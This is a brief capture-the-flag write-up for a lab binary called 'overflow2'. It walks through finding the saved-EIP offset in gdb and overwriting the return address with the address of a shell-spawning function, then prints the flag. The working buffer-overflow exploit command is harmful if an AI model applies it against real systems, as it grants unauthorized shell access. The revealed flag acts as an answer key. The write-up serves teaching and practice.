from the souce code we know that

we need to use overflow to turn the return value

to the function get_shell

first we use "gdb overflow2" and get into the gdb mode

then we set the input "set args `python -c 'print "A"*30'`"

to 30 As and "run" it

from the result we know that the return value

eip occupies positions 28-32 above the base of our stack

so we test set args `python -c 'print "A"*28 + "\x23\x12"'`

and confirmed the stack order

the "(gdb) print &give_shell" and get the addr of get_shell : 0x80484ad

so we exit the gdb

"./overflow2  `python -c 'print "A"*28 + "\xad\x84\x04\x08"'`"

and we r in the shell

"cat flag.txt"

flag : controlling_%eip_feels_great
